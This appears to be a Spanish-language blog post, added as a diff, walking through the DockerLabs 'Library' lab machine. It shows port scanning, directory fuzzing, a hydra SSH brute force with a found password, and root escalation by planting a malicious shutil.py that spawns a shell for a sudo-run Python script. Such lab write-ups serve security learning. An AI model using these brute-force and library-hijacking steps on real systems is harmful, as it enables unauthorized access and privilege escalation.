@@ -1,0 +1,75 @@
+---
+layout: post
+title: "Library"
+date: 2024-10-29
+ 12:30:23
+category: dockerlabs
+vm: dockerlabsfacil
+---
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Library </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
+</table>
+
+<br>
+
+**1\.** Escaneamos puertos abiertos de la maquina, tenemos ssh y apache corriendo.
+
+`sudo nmap -p- --open -T5 --min-rate=5000 -sCV -n -Pn 172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/library/nmap.png){:.margin}
+
+**2\.** Revisamos la web apache pero no tenemos nada ahi.
+
+`http://172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/library/80.png){:.margin}
+
+**3\.** Hacemos fuzzing de directorios web, encontramos un fichero php donde podemos ver un texto.
+
+`gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`
+
+![img](/notas/public/img/dockerlabs/library/gobuster.png){:.margin}
+![img](/notas/public/img/dockerlabs/library/index.png){:.margin}
+
+**4\.** Hacemos fuerza bruta al ssh, suponiendo que el texto encontrado es una contraseña. :) Ya pillamos el usuario.
+
+`hydra -L /usr/share/wordlists/rockyou.txt -p "JIFGHDS87GYDFIGD" ssh://172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/library/hydra.png){:.margin}
+
+**5\.** Me conecto por ssh; revisamos binarios sudoers, tenemos el binario python que ejecuta un script donde podemos ver que importa una libreria, pero ojo que no tiene la ruta definida osea que podemos hacer python library hijacking.
+
+`ssh carlos@172.17.0.2`
+
+`sudo -l`
+
+`cat /opt/script.py`
+
+![img](/notas/public/img/dockerlabs/library/sshcarlos.png){:.margin}
+![img](/notas/public/img/dockerlabs/library/sudol.png){:.margin}
+
+**6\.** Tenemos permisos para escribir en opt mismo, podemos crear ahi nuestro shutil.py para suplantar la libreria y escalar privilegios; tambien podemos exportarlo al path por las dudas; logramos ser root :) .
+
+`ls -dl /opt`
+
+`cd opt`
+
+`echo -e "import os \nos.system('/bin/bash')" > shutil.py`
+
+`export PATH=/opt:$PATH`
+
+`sudo -u root /usr/bin/python3 /opt/script.py`
+
+![img](/notas/public/img/dockerlabs/library/root.png){:.margin}
+
+<br>
+
+<a href="#">_Finalizado._</a>
